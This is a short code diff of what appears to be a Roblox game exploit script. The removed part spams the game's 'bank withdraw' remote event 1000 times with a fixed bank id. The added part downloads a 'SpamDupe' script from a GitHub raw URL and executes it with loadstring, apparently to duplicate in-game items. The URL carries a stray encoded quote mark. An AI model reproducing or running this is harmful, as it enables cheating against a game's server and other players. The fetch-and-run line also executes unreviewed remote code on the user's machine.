@@ -1,25 +1,2 @@
-print("HI")
-workspace.__THINGS.__REMOTES.MAIN:FireServer("b", "bank withdraw")
-local function Bank(id)
-	local self = {}
-	function self:withdraw(pets, gems)
-local A_1 = 
-{
-	[1] = id,  
-	[2] = 
-{
-}, 
-	[3] = gems
-}
-local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["bank withdraw"]
-Event:InvokeServer(A_1)
-end
-return self
-end
---//
-local bankid = "f7fe87bb-90a4-4ee1-a8e7-35c252f1f8e6"--bank
-for i=1, 1000 do
-	Bank(bankid):withdraw({}, 1)
-	print('withdrawed 1 gem')
-	task.wait()
-end
+_G.DupeIdYoyo = "6a89e017-8450-4b68-b736-b6420f80c727"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1Toxin/AWSDupe/main/SpamDupe%22))()
